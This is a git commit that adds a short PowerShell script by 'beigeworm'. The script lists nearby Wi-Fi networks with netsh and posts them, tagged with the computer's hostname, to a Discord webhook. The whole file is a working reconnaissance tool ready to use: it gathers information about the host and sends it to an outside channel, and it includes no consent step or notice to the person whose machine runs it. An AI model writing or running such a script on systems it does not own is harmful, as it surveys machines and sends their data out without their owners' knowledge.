db128e809152db3d8d5c15c90d70a1bc5b4bd745
beigeworm <93350544+beigeworm@users.noreply.github.com>
2023-11-27 10:51:24 +0000

    Add files via upload

---
+++ Discord Scripts/Nearby-WIFI-to-Discord.ps1
@@ -0,0 +1,20 @@
+<#============================== beigeworm's nearby networks to discord ===================================
+
+SYNOPSIS
+Using powershell to open the nearby networks window, then run netsh command to enumerate the networks and finally send the info to discord.
+
+USAGE
+1. Replace YOUR_WEBHOOK_HERE with your webhook
+2. Run the script and wait for results in discord.
+
+#>
+
+$hookurl = "YOUR_WEBHOOK_HERE"
+
+$showNetworks = explorer.exe ms-availablenetworks:
+sleep 5
+$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
+$Wifi = ($NearbyWifi|Out-String)
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$Wifi"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+
